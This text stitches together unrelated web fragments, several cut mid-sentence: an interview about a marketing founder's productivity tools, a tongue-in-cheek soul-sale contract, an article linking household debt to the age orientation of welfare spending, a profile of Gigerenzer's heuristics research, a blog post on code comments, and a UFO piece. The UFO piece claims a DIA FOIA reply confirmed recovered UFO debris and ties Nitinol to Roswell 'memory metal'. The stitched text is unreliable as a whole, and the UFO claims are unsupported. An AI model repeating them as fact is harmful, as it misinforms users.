business and it’s very hard for entrepreneurs to realize that dream without proper help. Small business owners keep coming at me with a sense of distrust, which is valid as they might have burnt before or they’re hearing conflicting things from multiple people. They’re in a confused state, I know I need it but I have no idea what to do.</p><p>The thing that propels and motivates me with Markitors is to help small businesses make a big impact. With Markitors the goal is to create something larger than what a freelancer can and make a difference in many people’s lives. I believe small businesses are the backbone of the American economy and worldwide economy. If we can help that space by giving small businesses more clarity on how they could realize their dreams then I don’t think there can be anything better than that.</p></div><h3 id="why-his-company-is-called-markitors-">Why his company is called “Markitors”?</h3><div><p>When I graduating from college, I majored in accounting. My first job out of school was of a “Financial Auditors”, so I was auditing balance sheets and financial statements. I then transitioned over to marketing and said let’s combine marketing and auditors in one company name and hence, “Markitors”.</p><p>It was a good representation of the differentiation I was bringing to the market and on top of that, the domain was available so I just went with it.</p><p>Another thing I like about the name “Markitors”, is that the misspellings are io which is short for input-output. Since SEO is increasingly technology and data-driven, so that input-output (io) really helps position the differentiation we’re seeking.</p></div><h3 id="what-the-pandemic-has-taught-about-time-management">What the pandemic has taught about time management?</h3><div><p>For me, it’s essentially that it’s impossible to work in the mornings with kids at home until they’re off to school. Else, it’s just calling for frustration throughout the day. The first part of my day, say 6 AM to 8 AM is focused on getting the kids out of the doors so that I can focus on work.</p><p>Instead of having this balance, I prefer giving full attention and focus on 1 thing. That’s lesson number 1 for me. In the mornings it’s my kids, and then my work.</p></div><h3 id="productivity-tools-he-uses">Productivity tools he uses</h3><div><p>I use a project management tool to organize everything, for me that’s <strong>Asana</strong>.</p><p>Asana helps me plan-out and prioritize different tasks based on today feature, upcoming feature and the stuff that’s later. That helps me organize my activities based on when they need to get done.</p><p>Then I use <strong>Google Calendar</strong> for scheduling and blocking time for activities. I have mainly 2-hour blocks to get stuff done. Time-blocking on my calendar helps limit distractions and really get things done that need to be done.</p><p>I’ll also give a shoutout to <strong><a href="https://www.mailmanhq.com/">Mailman</a></strong>, it has been awesome from a limiting-distractions point of view. The way that I structure and use Mailman is I have 3 email deliveries throughout the day, morning delivery at 7 AM, the afternoon delivery at 12:30 so that I can have lunch and when I come back there are some messages to address and then I have the end of day delivery at around 4:30 PM to quickly address the things that I need to before I log off for the day.</p><p>I don’t if you’ve watched the documentary Social Dilemma. It basically talks about how people are addicted to certain technologies and I find it funny that one of my friends who I went to high school with, wasn’t addicted to social stuff but he was addicted to email. Honestly, I could sympathize with that, as I’m not very active on social but digital addiction can very well be email. Mailman has really helped me limit those distractions and stay productive.</p><p>Talking about productivity tools, another good one I use is <strong>Calendly</strong>. It has been really helpful in self-scheduling meetings and client calls, availing the continuous back and forth for finalizing a time that works for both parties.</p></div><h3 id="on-managing-a-team">On managing a team</h3><div><p>Recently, we made a key hire at Markitors, “VP of Operations “ to take care of the day to day things that keep coming up. When you’re running a marketing agency, small fires keep popping, and those need to be addressed, so having someone responsible to take care of all of that really helps the founder or CEO focus on the more important things like growing the business.</p><p>This is also a good thing for the team, as I think of myself as more like a disruptor, I like to experiment, challenge, and change things. That chaotic nature is not good for employees, who’d like to have some stability. Bringing in someone to take care of operations has ensured that, while I get to dabble more in creative work, taking the business forward and in the direction we want to go in.</p></div><blockquote>If you like this blog post, please take a minute to share it around. <a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fblog.mailmanhq.com%2Fbrett-farmiloe-markitors%2F&amp;via=Mailman_HQ%20%40mohitmamoria&amp;text=Brett%20Farmiloe%20-%20CEO%20with%203%20kids%20and%202%20businesses%20to%20run%21">Click here to get an auto-populated tweet</a>.</blockquote><h3 id="team-productivity-by-wins-">Team productivity by “wins”</h3><p>Every morning at 8:30 we have a team meeting where we all discuss our “wins” from the previous day and 1 priority for the day, then everyone goes their own ways and we hold each other accountable to accomplish that 1 thing.</p><h3 id="on-burnout">On burnout</h3><div><p>I think if any entrepreneur would be lying if they say they’ve never been burnt out or close to burnout.

                    <p><strong><u>SALE OF SOUL AGREEMENT</u></strong></p><p>This Sale of Soul Agreement (hereafter “<strong>Agreement</strong>”) is effective as of the date upon which the party selling their soul (hereafter “<strong>Seller</strong>”) signs the contract and returns it to the party receiving the soul (hereafter “<strong>Buyer</strong>”) in either electronic or physical format. This agreement is entered into freely by both parties set forth in the signature block below (“Buyer” and “Seller”) and both parties agree to honor and be bound by the terms of this agreement in any court, real, imagined, or otherwise, or as set before any judge or any being serving in a similarly recognizable capacity making judgment as to the validity of this contract, in any state of reality or nonreality, physical or metaphysical, for all eternity (past, present, and future) and also any states of being or nonbeing outside of our human conception of time.</p><p><strong>BUYER AND SELLER AGREE AS FOLLOWS:</strong></p><p><strong>SECTION I. DEFINITION OF “SOUL”</strong></p><p>A. &nbsp; &nbsp;The “Soul” of the Seller for the purposes of this contract is understood to mean the spiritual, immortal, and immaterial essence of their self which exists independently and distinctly from their material being.</p><p>B. &nbsp; &nbsp; While both the Buyer and the Seller acknowledge that the true nature, scope, and existence of any Such soul, whether or not it exists, is unknown and unknowable to either of them, the ambiguity involved in no way limits or renders any portion of this agreement invalid and the total scope of the Soul shall be considered as subject to the agreement.</p><p>C. &nbsp; &nbsp;The Seller’s religion or belief system lacking a concept of a “Soul” or metaphysical reality lacking the concept of a “Soul” as given shall not alter the stated intent of this contract, and the essence being transferred to the Buyer shall constitute whatever immaterial equivalent, if any, exists that is closest in nature to the given definition of the Seller’s spiritual, immortal, and immaterial essence.</p><p>D. &nbsp; &nbsp;In the event that a “Soul” is not actually immortal, this contract shall remain in effect through whatever duration of time or non-time that the soul exists in any manner, state, or way of being.</p><p>E. &nbsp; &nbsp; In the event that the Seller’s “Soul” does not exist as an independent entity outside of the whole “one-ness” of reality as commonly described in some belief systems, and in the event that this belief about the nature of reality reflects actual reality, this contract will remain in effect for whatever period of time or non-time and to whatever degree that the Seller’s immaterial essence is distinguishable in any form, manner, or state of being from the sum whole of immaterial or material existence.</p><p>F. &nbsp; &nbsp; The Buyer acknowledges and fully understands that the Seller may deny the existence of any such Soul as defined here in Section I or deny the possibility of transferring ownership of said Soul to another party according to their personal belief system. Buyer agrees to accept the risk of being unable to actually take possession of said Soul from the selling party due to either its nonexistence or non-transferability on the part of the Soul’s owner.</p><p><strong>SECTION II. SALE AND TRANSFER OF SOUL</strong></p><p>A. &nbsp; &nbsp;Buyer and Seller intend this Agreement to be a contract of sale for the Seller’s Soul, as defined in Section I, wherein the Buyer shall provide the compensation outlined in Section III in exchange for ownership and use of the Seller’s Soul as described in Sections I and IV.</p><p>B. &nbsp; &nbsp; The transfer of ownership of this Soul shall occur at the moment this document is signed and returned to the Buyer by the Seller in any format, electronic or physical.</p><p>C. &nbsp; &nbsp;If for any reason this Soul or a portion of this Soul shall be found to be non-transferable from Seller to Buyer, this shall in no way limit the other provisions of this agreement or the Buyer’s rights with respect to use and possession of the Soul. Seller agrees to transfer ownership of Soul to Buyer to whatever degree is possible, in part or in whole, and commits to the terms of usage, transfer, or possession of Soul as described in Section IV to whatever degree may be possible.</p><p>D. &nbsp; &nbsp;As compensation for this transfer of ownership of the Soul, Buyer agrees to compensate Seller an amount of no less than ten (10) United States Dollars, to be transferred according to the terms given in Section III, within 48 commonly recognized Earth-hours of the receipt of the signed agreement via any medium, physical or electronic.</p><p>E. &nbsp; &nbsp; This transfer of ownership of the Soul from Seller to Buyer provides the Buyer with full usage rights and ownership of the soul to do with as they see fit, including but not limited to the provisions given in Section IV of this document.</p><p>F. &nbsp; &nbsp; This transfer of ownership of the Soul from Seller to Buyer prevents the Seller from any personal or public use of or claim of ownership to the transferred Soul without the express permission, in writing, of the Buyer. Other than limiting their making claims of ownership to the Soul, this clause shall in no way limit the material actions of the Seller.</p><p>G. &nbsp; &nbsp;This transfer is permanent and irrevocable except as given in the terms of this contract. Buyer shall be the new owner of Seller’s Soul for all time and non-time and states of being, with all according rights and privileges of use as given in Section IV.</p><p>H. &nbsp; &nbsp;Buyer and Seller agree that actual possession, use, or storage of the Soul by the Buyer is not required for Buyer’s ownership, transfer, or future use of the Soul to be enforceable under these terms. Buyer may, at their discretion, leave the Soul in the location it currently exists or move it from its current location at any time and at their own discretion. Buyer may use or not use the soul as Buyer sees fit. Failure to take possession of or to use the Soul shall in no way invalidate the ownership, usage rights, subsequent transfer, or any other term of this contract with respect to the transferred Soul.</p><p><strong>SECTION III. COMPENSATION FOR TRANSFER</strong></p><p>A. &nbsp; &nbsp;Buyer agrees to compensate Seller with an amount of no less than ten (10) United States Dollars for the transfer of the Soul within 48 commonly recognized Earth-hours of the receipt of the signed agreement via any medium, physical or electronic, as described in Section II-C, according to the conditions outlined in this Section (III).</p><p>B. &nbsp; &nbsp; The sending of these funds (hereafter “the payment”) shall occur via PayPal.com and shall be sent to an electronic mail address provided by the Seller.</p><p>C. &nbsp; &nbsp;In the event that no address is provided by the Seller to render the payment, Buyer will send payment to the address used to transfer electronically signed contract documents or make a reasonable attempt to acquire such an address from the Seller via the same communication medium over which the signed documents are transferred. Failure to acquire a valid payment address from Seller within the 48-hour period shall not invalidate the contract or the Buyer’s ownership and usage of transferred Soul provided this is the primary reason for the Buyer’s inability to render compensation.</p><p>D. &nbsp; &nbsp;Seller acknowledges that small variations in actual value of currency may occur from moment to moment and that in sending a nominal amount of $10 USD via the PayPal payments system within 48 hours of receipt of the contract as described in Section III-A, they have satisfied their obligation to compensate the Seller under the terms of this agreement.</p><p>E. &nbsp; &nbsp; Seller agrees to pay any and all standard PayPal fee percentages that may arise in the course of transferring sent funds to their personal accounts.</p><p>F. &nbsp; &nbsp; Seller agrees that their failure to accept the funds shall in no way invalidate the agreement and that the contract will remain completely whole and enforceable regardless of their acceptance or non-acceptance of the payment.</p><p>G. &nbsp; &nbsp;In the event that the Buyer fails to send the compensation as described in this Section (III) within 48 hours of receipt of the contract signed by the Seller, the contract will be considered null and void and the ownership of the Soul shall revert to the Seller.</p><p>H. &nbsp; &nbsp;No action or use of the Soul may be undertaken by the Buyer within the 48-hour period beginning with the receipt of the contract signed by the Seller until and unless the Buyer has adequately rendered payment to Seller as described in this Section (III).</p><p><strong>SECTION IV. OWNERSHIP AND USE OF SOUL</strong></p><p>A. &nbsp; &nbsp;Buyer and Seller agree that the owner of the Soul may possess, claim, keep, store, offer, transfer, or make use of it in whole or in part in any manner that they see fit to do so, conventional or otherwise, including (but not limited to) the purposes described in this Section (IV). Example uses of the Soul which would be permitted under these terms include (but are not limited to):</p><ul><li>Publicly claiming to be the owner of the Soul in question.</li><li>Transferring of said Soul, in whole or part, to any person or entity, for any reason.</li><li>Sacrificing or offering said Soul, in whole or in part, to any deity or spiritual entity.</li><li>Spending or using the soul, in whole or in part, for some purpose which causes it to diminish in value, quantity, or substance or be subsumed into a larger whole.</li><li>Transferring the burden, credit, or responsibility of any actions reflected in the State of a Soul from another Soul to this Soul or from this Soul to another Soul.</li><li>Long term storage, usage, or preservation of the Soul in a state which would prevent it from taking the course of development, evolution, or relocation it may otherwise take naturally or due to the actions or material status of the Seller.</li></ul><p>B. &nbsp; &nbsp; Seller agrees to fully relinquish any right of ownership or usage they have in the Soul and agrees that they will not attempt to use, keep, transfer, or sell the same Soul again even if it remains in their possession or immediate vicinity.</p><p>C. &nbsp; &nbsp;Seller agrees not to interfere or attempt to interfere via metaphysical, magickal, or spiritual means with Buyer’s attempt to claim, transfer, or …</p></div></section></article></div></main></div></div>

<p>You might think the US would be world champion of household debt, yet the highest private indebtment has always been in the Nordic countries. Debt, however, takes different forms, writes <strong>Martino Comelli</strong>. In Scandinavia, inclusive welfare systems make debt into an investment. Elsewhere, gerontocratic welfare and consumer credit can become a burden</p>
<h2>Debt and welfare: a trade-off?</h2>
<p>The economic crisis of 2007–2008 put household debt in the spotlight. <strong><a href="https://en.wikipedia.org/wiki/Financial_crisis_of_2007%E2%80%932008">A common narrative</a></strong> was that cheap credit fuelled a house price bubble in the US. The financial industry sold derivatives based on those debts and many European banks who bought those products went belly up, allowing the crisis to spread across the Atlantic.</p>
<p>Debt, and in particular, household debt, has been regarded with suspicion ever since. Many scholars argue that the rise of household debt was caused by welfare retrenchment, suggesting a trade-off between welfare and debt. A lack of welfare was compensated by private leveraging. Other scholars pointed out that many governments were pushing for asset-based welfare – like buying housing as a form of private welfare – encouraged by steadily rising house prices in the years preceding the crash.</p>
<figure><img loading="lazy" width="683" height="776" src="https://theloop.ecpr.eu/wp-content/uploads/2021/02/figure1.png" alt="" srcset="https://theloop.ecpr.eu/wp-content/uploads/2021/02/figure1.png 683w, https://theloop.ecpr.eu/wp-content/uploads/2021/02/figure1-264x300.png 264w" sizes="(max-width: 683px) 100vw, 683px"><figcaption>Figure 1: Quantity of household debt in OECD countries</figcaption></figure>
<p>Yet empirical data suggests that the welfare-debt trade-off may be mistaken. Curiously, the highest indebtment ratio in the OECD was, and is, in northern European countries such as Denmark, Norway, Sweden and the Netherlands. These are the countries with the most far-reaching welfare programmes, and known to be fiscally responsible. Clearly, the welfare-debt trade-off theory needs a rethink.</p>
<h2>Private debt, public virtues: on the age-orientation of welfare</h2>
<p>Is it, then, a complementary relationship? Generous welfare provides security, encouraging people to borrow more. But this interpretation does not fly either. Many European countries have generous welfare – France for example, has higher social spending than Denmark – but nowhere near the level of household debt of the Nordic countries.</p>
<p><strong><a href="https://doi.org/10.1080/02732173.2021.1875088">My research on the relations between welfare and household debt</a> </strong>offers a novel explanation of the welfare-debt conundrum. There is no trade-off between private debt and welfare, nor is there a complementary relation. What matters is where the welfare money is spent and how. It isn’t necessarily about the quantity of spending, but about its direction.</p>
<blockquote><p>While mortgages are a marker of privilege, another common type of debt, consumer credit, is often a marker of need</p></blockquote>
<p>Most welfare spending is concentrated on older generations, particularly retired people. According to <strong><a href="https://en.wikipedia.org/wiki/Life-cycle_hypothesis">Franco Modigliani</a>'s life-cycle <a href="https://en.wikipedia.org/wiki/Life-cycle_hypothesis">hypothesis</a></strong>, debt is linked to one's stage in life. People take on debt when young because their income is low but their expenses (housing, children, leisure) high – and they pay this debt off as they age.</p>
<p>Countries that not only provide social help for the elderly, but counterbalance that with spending and services for the young and economically active, tend to have higher private debt (see Figure 2). In particular, countries that spend on education and active labour market policies, and those which offer better protection for people in precarious jobs, have the highest levels of private debt.</p>
<p>Household debt is an unintended consequence of assuring a smoother transition to adulthood. In conservative continental European countries, however, despite high welfare spending, welfare is concentrated mostly on the elderly and on people with stable jobs. This discourages younger generations from taking risks, including mortgage debt.</p>
<figure><img loading="lazy" width="980" height="714" src="https://theloop.ecpr.eu/wp-content/uploads/2021/02/figure2.png" alt="Figure 2. Quantity of household debt by the age orientation of welfare spending in OECD countries" srcset="https://theloop.ecpr.eu/wp-content/uploads/2021/02/figure2.png 980w, https://theloop.ecpr.eu/wp-content/uploads/2021/02/figure2-300x219.png 300w, https://theloop.ecpr.eu/wp-content/uploads/2021/02/figure2-768x560.png 768w" sizes="(max-width: 980px) 100vw, 980px"><figcaption>Figure 2. Quantity of household debt by the age orientation of welfare spending in OECD countries.</figcaption></figure>
<p>Note: Figure 2 illustrates an inverse relationship between the elderly orientation of social spending (EBiSS, on the x axis), and the quantity of household debt as % of net disposable income (on the y axis). The EBiSS is a rate between social spending for the economically active (at the numerator) versus spending oriented toward the elderly (at the denominator). A higher value on the EBiSS index means that a greater share of social spending is going to the elderly.</p>
<h2>Consumer credit? The three worlds of debtfare capitalism</h2>
<p>Most of the debt in OECD countries is mortgage debt. While mortgages are a marker of privilege, another common type of debt, consumer credit, is often a marker of need.</p>
<p>If we consider consumer credit, the welfare-debt theory makes sense again. While consumer credit is more the exception than the norm in Europe, and almost absent in the Nordic countries, it is common in Anglo-liberal countries (UK, US and Canada) where it is used by families as a substitute for poor welfare provision.</p>
<figure><img loading="lazy" width="895" height="531" src="https://theloop.ecpr.eu/wp-content/uploads/2021/02/figure3.png" alt="Figure 3. Clusters measures" srcset="https://theloop.ecpr.eu/wp-content/uploads/2021/02/figure3.png 895w, https://theloop.ecpr.eu/wp-content/uploads/2021/02/figure3-300x178.png 300w, https://theloop.ecpr.eu/wp-content/uploads/2021/02/figure3-768x456.png 768w" sizes="(max-width: 895px) 100vw, 895px"><figcaption>Figure 3. Clusters measures</figcaption></figure>
<p>Figure 3 shows three main patterns of private debt/welfare configurations; what we call debtfare:</p>
<ol>
<li>In the Nordic / youth-oriented model, household debt is high, consumer credit is low, and the rate of young people Not in Education, Employment, or Training (NEET) is very low.</li>
<li>
<p>In conservative European countries such as Germany and Italy, there are a lot of NEETs, welfare is orientated toward the elderly, and there is little household debt or consumer credit.</p>
</li>
<li>
<p>In Anglo-liberal countries such as the UK, US and Canada, consumer credit is high, and so is overall debt (though not as high as in the Nordic countries). The share of NEETs is remarkably high, and most welfare is oriented toward the elderly.</p>
</li>
</ol>
<p>Household financialisation, then, follows different paths and patterns. Both liberal and conservative welfare is gerontocratic, and they have a high level of NEETs, but while the former is oriented toward a market solution to inequality (more debt), the latter discourages any form of risk taking.</p>
<p>So, while paying attention to debt is important, it shouldn’t be the only lesson of the 2008 crisis. Further attention should be paid to the macro-sociological conditions that give debt different meanings: inclusive welfare can make debt into an investment, but gerontocratic welfare can make debt a burden.</p>

The outcome of that research has just been published in the journal, <em>Crime Media Culture</em>. It's called "'Whenever there's trouble. Just yelp for help': Crime, Conservation and Corporatization in Paw Patrol."</p>  <p>Paw Patrol, an animated series that began in 2013,&nbsp;is about a group of do-good dogs who are led by a 10-year old boy, named Ryder. Together they rescue various people who find themselves in tricky situations. The show has spawned a run on&nbsp;franchise toys, as well as a travelling stage show.</p>  <p>"I'll start with the depiction of the state.

<p>Why simple rules of thumb often outperform complex models</p>

</div><div>

<p>This is the age of big data. We are constantly in quest of more numbers and more complex algorithms to crunch them. We seem to believe that this will solve most of the world’s problems - in economy, society and even our personal lives. As a corollary, rules of thumb and gut instincts are getting a short shrift. We think they often violate the principles of logic and lead us into making bad decisions. We might have had to depend on heuristics and our gut feelings in agricultural and manufacturing era. But this is digital age. We can optimise everything.</p>

<p>Can we?</p>

<p>Gerd Gigerenzer, a sixty nine year German psychologist who has been studying how humans make decisions for most of his career, doesn't think so. In the real world, rules of thumb not only work well, they also perform better than complex models, he says. We shouldn’t turn our noses up on heuristics, we should embrace them.</p>

<p>That view is increasingly gaining global attention. Partly because of the failure of complex models in predicting major events, such as the financial crisis in 2008, and the election of Donald Trump last year. Partly because Gigerenzer is backing what he says with some cutting edge research. His team at The Center for Adaptive Behavior and Cognition (ABC) at Max Planck Institute for Human Development, Berlin studies the role of heuristics in decision making, in a way that can be coded into a computer programme, tested, and used in the real world. In finance, Bank of England is using their insights to design simpler rules to avert banking crisis. In healthcare, medical organisations are working with them to teach risk literacy to doctors and patients so they can evaluate evidence better. Artificial intelligence developers are looking up at their work to see if they can make machines think better.</p>

<h3>An adaptive toolbox&nbsp;</h3>

<p>Gigerenzer was in India recently to conduct a seminar, called the Winter School on Bounded Rationality at TA Pai Management Institute, Manipal, where his audience were a skeptical bunch of research scholars from some of the top institutions in India and abroad.&nbsp;</p>

<p>Gigerenzer, a tall man sporting a white mustache and possessing the gait of a country gentleman, was in full flow - explaining, clarifying, defending his worldview using a mix of evidence from research, personal anecdotes and a deadpan display of academic confidence. When a finance professor with an obvious love for mathematical analysis said he didn’t agree with Gigerenzer’s views, he replied, “Well, I have three days to convince you”.</p>

<p>In short, Gigerenzer's arguments go like this. There is a big difference between risk and uncertainty. You are dealing with <em>risk</em> when you know all the alternatives, outcomes and their probabilities. You are dealing with <em>uncertainty</em> when you don’t know all the alternatives, outcomes or their probabilities.&nbsp;</p>

<p>When you are dealing with risk, complex mathematical models and fine tuning them for optimisation work. However, when you are dealing with uncertainty, they don’t work well, because the world is dynamic.&nbsp;</p>

<p>What you then need is a set of simple rules of thumb that are robust and gut instincts sharpened by years of experience. You need <em>an adaptive toolbox</em>. To use the toolbox well, logical rationality - knowing rules such as transitivity and set theorem - won’t suffice. What’s needed is <em>ecological rationality</em>, that is knowing which heuristic works in which environment.&nbsp;</p>

<h3>Innovating over a cup of coffee</h3>

<p>To study all of these, Gigerenzer has assembled a team of international and interdisciplinary team in ABC at&nbsp;Max Planck Institute. “I don’t believe in the borders of the regular disciplines”, Gigerenzer said. “They may be good for teaching but certainly not for innovation. My group has about 35 researchers and half of them, at any point, are from ten different disciplines - psychology, machine learning, computers, economics, engineering, philosophy, biology and so on. The point is to get all these minds together to solve one problem.”</p>

<p>That problem is: <em>How do humans and other animals make decisions under uncertainty, that is, when time and information are limited and the future is unknown? &nbsp;</em>They try to solve this problem by designing models of how people make decisions, and by&nbsp;conducting experiments, testing one model against another to see where rules of thumb (heuristics)&nbsp;perform better than others. &nbsp;</p>

<p>“Another important thing,” he continued, “is to make them feel like a family, because people from different disciplines typically avoid talking to one another. They claim no one would understand their language. At Max Planck I have put them all on one floor. We have tea and coffee everyday at 4 PM. No one is obligated to come, so they come. And they talk, they ask questions: “What does this concept mean?,” “Why don’t you do that instead of this”. And, so we make progress.”</p>

<p>“It is one of the most intellectually stimulating environments for research,” Özgür Simsek, a researcher in Gigerenzer’s team said. Simsek studied industrial engineering in Turkey, before moving to University of Massachusetts, Amherst to get a masters in operations research and a PhD in artificial intelligence and machine learning. After her doctorate, she was looking for something novel to work on, and found the research on bounded rationality at Max Planck to be interesting. “I thought the research on bounded rationality had perhaps something new to say about AI and machine learning, and perhaps we could bring some of these ideas into AI. At the same time, I thought my computational background, working in algorithms, analyzing algorithms, developing algorithms could be useful in understanding heuristics better,” Simsek said. It is eight years since she joined.&nbsp;</p>

<p>The path that Konstantinos Katsikopoulos took to land in Max Planck Institute was not too different. He studied in Athens, and then went on to get his PhD in operations research from MIT. He came to know about Gigerenzer’s work when he stumbled on a book title “Simple Heuristics that Make Us Smart.” The was intrigued by the words simple and smart.&nbsp;He already knew the limitations of complex optimising models. “When I studied mathematics, the most basic thing I learned is that any claims about optimality or optimising are conditional on the model. Your results are always the best according to a model of the world. And a model of the world is not reality. You can’t take the model per se as a benchmark of success in the world.” The idea of comparing complex optimisation models against simple heuristics appealed to him. He joined Max Planck as a postdoc fifteen years ago. Katsikopoulos recently shifted to the Business School of the University of Southampton, UK, and continues to be associated with Max Planck through Harding Center for Risk Literacy as an adjunct scientist. (Harding Center, a part of Max Planck&nbsp;trains physicians and patients to better understand medical evidence, and promotes risk literacy among school children. Gigerenzer is not a fan of the Nudge (using insights behavioural economics and psychology to change behaviour of people by subtle cues and changes in a setting). He believes teaching people how to assess risks is a more straightforward and effective way to get positive results).&nbsp;&nbsp;&nbsp;</p>

<p>Another researcher, Shenghua Luan, was doing his PhD in psychology at University of Florida, after graduating from Peking University in China. At Florida, he attended a seminar in which Gigerenzer’s work was discussed. He started studying his papers and got hooked. After PhD, he spent some time at Max Planck as a postdoc, before moving to Singapore to teach at Singapore Management University. Soon, he was missing the exciting research at Max Planck so much, that he decided to go back. When he speaks about his work, his enthusiasm can spill over. “This is not some abstract stuff. This is what people do in real life,” he said.</p>

<h3>The skeptical statistician</h3>

<p>Gigerenzer’s own intellectual journey started when was wondering why he chose a career in academics over entertainment music years ago. &nbsp;“As a musician at that time, I was earning, may be, five or ten times more than what an assistant professor would earn. Now, I did not sit down and list all possible consequences of staying in music, all possible consequences of going to academia, weigh them and add them up, because that made no sense. I wouldn’t have been able to estimate all of them. I just took the decision. It was a qualitative decision. Thinking about it, got me interested in how people make decisions.”</p>

<p>Gigerenzer was contrasting his decision making process to a method that has been long popular among intellectuals of scientific temper. They believed one can arrive at an optimal decision by listing down all the likely advantages and disadvantages of various options. Charles Darwin tried that technique to decide on whether to marry or not. Benjamin Franklin strongly recommended this method - he called it Moral Algebra - to his nephew who was looking for his wife. “if you do not learn it, I apprehend you will never be married,” Franklin wrote to him. It has not vanished. We will find some version of this method being practiced by the bureaucracy in government and business even today. Gigerenzer saw that he didn’t use this method to make one of the most important decisions of his life. In fact, most of us don’t. Our decisions are mostly qualitative, not quantitative. &nbsp;</p>

<p>“When I started as a student i didn’t know very much about psychology,” Gigerenzer said. “Basically, I knew about Freud and a few other psychoanalysts. I quickly realised that I can explain almost everything with these concepts. I got disinterested. I didn’t want a theory that explains everything. Then I got interested in personality psychology. I remember there was a big book, 400-500 pages, on the subject and I knew it almost by heart. Some friends …</p></div></div></div>

<p>It’s interesting how learning is sometimes like travel. At the end of the journey, you end up back where you started, only with a broadened perspective.</p>
<p>Trivial example: code comments. When I was new to programming I commented my code extensively. If I’m honest, it was to compensate for my difficulties in reading code. A consequence of this is it allowed me to be lazy in the code I wrote. I wouldn’t need to put much effort into making it clear and readable because there were always plain English comments to fall back on.</p>
<p>Then I joined a team that was militantly against comments, where every comment was an admission of failure to write readable code. I took this on-board and disciplined myself not to rely on comments. This forced me to spend more time on refactoring my code to make it as readable and “self-documenting” as possible. I still wouldn’t say I’m there yet, but I’m confident that my code is much more readable now than it was then.</p>
<p>However, in the last year or so, I’ve started adding comments again. Not too many, but here and there to add more context. It felt like blasphemy at first. Some of my comments are even somewhat redundant, but I’ve since learned that <a href="https://www.cnothelfer.com/redundant-encoding">encoding the same information in redundant ways</a> is an important principle for aiding our comprehension. For example, traffic lights use both colour and position to encode the same information.</p>
<p>Superficially it seems as though I’ve returned to where I started: I’m commenting code again. However, if I hadn’t disciplined myself to do without comments entirely for a while, I wouldn’t have been forced to learn how to write more readable code. Abstaining from code comments is a <a href="https://coderefinery.nz/2020/10/21/forcing-functions-in-software-development/">forcing function</a> for learning to write more readable code. At some point, you can re-integrate commenting as a useful tool rather than a crutch.</p>
<p>Interestingly, I’m confident that if I could travel back in time and tell past-me or any of my old teammates that, actually, comments can be a valuable tool to aid comprehension, I’m positive I would encounter strong resistance. This is just as it should be; I don’t think it can be any different. When you’re learning a new skill, it’s necessary to become somewhat closed off and follow a direction single-mindedly for a while, it’s part of the learning process. If you were too suggestible and deviated too easily, you would go around in small circles and never get anywhere.</p>
<p>You see the same pattern across the development community when a new technology or framework is introduced (I won’t name names. I’m sure you can think of some examples). In the early days, there is hype and zealotry. Then over time as more developers adopt the tech into production and real issues with it emerge, there is disillusionment and abandonment. Finally a more realistic, calibrated picture of the trade-offs of the technology emerge.</p>

<p>A stunning admission by the US government that it possesses UFO debris was recently made in response to a Freedom of Information Act (FOIA) request filed over three years ago by this author. In a reply letter, the US Defense Intelligence Agency (DIA) has ended decades of speculation by verifying that UFO material has indeed been recovered. Now officially referred to as UAP (Unidentified Aerial Phenomena) rather than UFOs, some of this material was placed with a defense contractor for analysis and storage in "specialized facilities." Incredibly, part of the information released discusses material with shape recovery properties, much like the "memory metal" debris found fallen at the Roswell UFO crash in 1947.</p>



<p>And based on the documentation received, it appears that the retrieved debris exhibits other extraordinary capabilities. In addition to "remembering" their original form when bent or crushed, some of these futuristic materials have the potential to make things invisible, "compress" electromagnetic energy, and even slow down the speed of light. Although much of the reports' details are redacted, what can be gleaned is that these technologies represent a literal quantum leap beyond the properties of all existing material known to man.</p>



<p>Finally, the whereabouts of the UFO debris held by the contractor is unknown. Some months ago they laid off their employees and ceased operations. Former company officials, when reached, refuse comment.</p>



<h6>THE FOIA REQUEST</h6>



<p>The original 2017 FOIA request made to the DIA asks for the physical descriptions, properties and composition of UFO/UAP material held by the government and its contractor. The request is unambiguous in its meaning. It refers to UFO/UAP material and "physical debris recovered by personnel of the Department of Defense as residue, flotsam, shot-off material or crashed UAPs or unidentified flying objects." The FOIA request can be seen in full <a href="https://7f215854-ce29-4a12-9bb0-f4e7eb88d38a.filesusr.com/ugd/aa4aac_c53f66ccc2f745908c6b639c1042977e.pdf" target="_blank"><span><span><span>here:</span></span></span></a></p>

<p><span><span><span><span>​</span></span></span></span></p></div><div id="comp-kkurd3px" data-testid="richTextElement"><p>In their reply, the DIA amazingly agrees that it has documents responsive to my request on recovered UFO debris and its analysis, the program under which it was administered, AATIP (the Advanced Aerospace Threat Identification Program), and that their defense contractor (Bigelow Aerospace in Las Vegas, Nevada) has stored the material. They also provide some reports related to the possible applications of the studied material.</p>



<p>The delays and excuses offered up during the years awaiting the FOIA response were many. They include that the records search involved another agency that needed to be consulted; that I had been emailing my former FOIA Officer though she'd left months ago and never received my follow-up communication; to a re-assignment of my case to the DIA's FOIA Chief, Steve Tumiski. After a lawsuit was threatened with the retention of counsel, the DIA somehow, after so very long, acted to respond.</p>



<h6>THE RELATION TO ROSWELL</h6>

</div><p>The information received includes several pages of what are called "advanced technology reports" on Nitinol - a shape recovery alloy. Nitinol has similar properties to the "memory metal" found fallen as debris at the Roswell, New Mexico UFO crash of 1947. The pages found within the FOIA reply on Nitinol explore its potential for integrating it into the human body for the improvement of health. Well over 40 witnesses to Roswell have mentioned a metal-like material that could "remember itself" when deformed or folded, returning to its original state seamlessly and instantly. In a series of investigative articles appearing in the UFO Explorations website article archive section, the case is credibly made that Nitinol represents our first</p><div id="comp-kkuwalzl" title=""><div data-testid="linkElement"><wix-image id="img_comp-kkuwalzl" data-image-info="{&quot;containerId&quot;:&quot;comp-kkuwalzl&quot;,&quot;displayMode&quot;:&quot;fill&quot;,&quot;imageData&quot;:{&quot;width&quot;:719,&quot;height&quot;:406,&quot;uri&quot;:&quot;aa4aac_4110780180b542edadc482e561165b0f~mv2.png&quot;,&quot;name&quot;:&quot;Roswell Disc, 719x406, enhanced with Pho&quot;,&quot;displayMode&quot;:&quot;fill&quot;}}" data-bg-effect-name="" data-is-svg="false" data-is-svg-mask="false" data-image-zoomed="" data-has-ssr-src="true"><img src="https://static.wixstatic.com/media/aa4aac_4110780180b542edadc482e561165b0f~mv2.png/v1/fill/w_169,h_96,al_c,usm_0.66_1.00_0.01,blur_2/Roswell%20Disc%2C%20719x406%2C%20enhanced%20with%20Pho.png" alt="Roswell Disc, 719x406, enhanced with Pho"></wix-image></div></div><div id="comp-kkuwz42y" data-testid="richTextElement"><p>attempts to replicate a material of the craft's construction. The Roswell debris was flown to Wright 